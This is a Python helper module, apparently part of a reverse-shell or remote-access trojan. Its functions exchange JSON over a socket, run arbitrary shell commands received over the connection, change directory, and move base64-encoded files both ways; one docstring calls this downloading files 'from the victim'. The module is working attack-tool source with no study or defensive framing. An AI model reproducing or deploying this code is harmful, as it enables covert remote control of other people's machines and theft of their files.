import subprocess
import json
import socket
import os
import base64

# Socket Functions

def _send(conn:socket.socket, data) -> None:
    """Sends data as json to conn. Takes conn and data."""

    json_data = json.dumps(data)
    conn.send(json_data.encode())

def _receive(conn:socket.socket):
    """Return data received form the conn."""

    json_data = ""
    while True:
        try:
            chunk = conn.recv(1024)

            if not chunk:
                return None
                
            json_data += chunk.decode()
            return json.loads(json_data)
            
        except ValueError:
            continue
        except (ConnectionResetError, TypeError):
            return None


# Excuting commands function

def _exec_command(command):

    try:

        if command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except OSError:
                return f"Directory {command[3:]} does not exits!"
                
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            return result
            
    except Exception as e:
        return e


# File function

def _does_file_exists(file) -> bool:
        """Check if a file exists or not. Return True or False."""
        
        return os.path.exists(file)

def _send_file(conn:socket.socket, file):
    """Send file to the conn. Takes conn and file."""
        
    with open(file, "rb") as f:
        _send(conn, base64.b64encode(f.read()).decode())

    return

def _write_file(name, data):
    """Download file from the victim."""

    try:
        with open(name, "wb") as file:
            file.write(base64.b64decode(data))
        
    except FileExistsError:
        print(f"[!] File named {name} exists.")